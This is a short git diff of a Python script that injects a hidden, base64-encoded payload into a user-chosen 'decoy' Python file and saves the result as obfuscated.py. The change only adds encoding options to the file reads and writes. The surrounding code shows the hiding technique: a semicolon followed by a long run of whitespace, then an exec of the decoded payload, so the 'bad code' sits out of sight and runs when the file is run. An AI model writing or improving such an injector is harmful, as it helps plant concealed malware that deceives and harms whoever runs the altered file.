@@ -15,7 +15,7 @@ def main():
     input2 = input("what is the decoy file location? ")
     part = input("What what line would you like to start the bad code? ")
 
-    with open(input2, 'r') as file:
+    with open(input2, 'r', encoding="utf8", errors="ignore") as file:
         data = file.readlines()
 
     codes = f";                                                                                                                                                                                                                                      import base64; exec(base64.b64decode({enc_txt}))\n"
@@ -24,7 +24,7 @@ def main():
     except:
         print("Error: Line number is out of range")
 
-    with open('obfuscated.py', 'w') as file:
+    with open('obfuscated.py', 'w', encoding="utf8", errors="ignore") as file:
         file.writelines( data )
 
 if __author__ != '\x4b\x2e\x44\x6f\x74\x23\x30\x30\x30\x31':
